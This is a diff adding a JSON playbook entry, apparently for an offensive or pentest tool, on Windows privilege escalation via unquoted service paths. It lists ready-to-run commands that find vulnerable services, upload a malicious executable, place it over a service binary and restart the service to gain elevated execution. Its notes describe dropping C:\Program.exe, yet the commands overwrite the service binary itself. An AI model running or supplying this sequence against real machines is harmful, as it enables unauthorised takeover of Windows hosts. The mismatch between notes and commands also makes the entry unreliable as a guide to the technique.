@@ -1,0 +1,17 @@
+{
+  "id": "win_unquoted_service_path",
+  "category": "WIN_UNQUOTED_SERVICE",
+  "binary": null,
+  "cve": null,
+  "exploitation": [
+    "exec <id> wmic service get name,pathname,startmode | findstr /i /v \"C:\\\\Windows\\\\\" | findstr /i /v \"\\\"\"",
+    "upload <id> /path/to/malicious.exe",
+    "exec <id> copy C:\\Windows\\Temp\\malicious.exe \"C:\\Program Files\\Vuln Service\\Vuln.exe\"",
+    "exec <id> sc stop <service> && sc start <service>"
+  ],
+  "post_exploit": ["exec <id> whoami"],
+  "notes": "If service path has spaces and is unquoted (e.g. C:\\Program Files\\Foo Bar\\svc.exe), Windows tries C:\\Program.exe first. Drop a binary at the first unquoted space.",
+  "source": "book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/unquoted-service-paths",
+  "tags": ["windows", "service", "unquoted-path"],
+  "severity": "medium"
+}
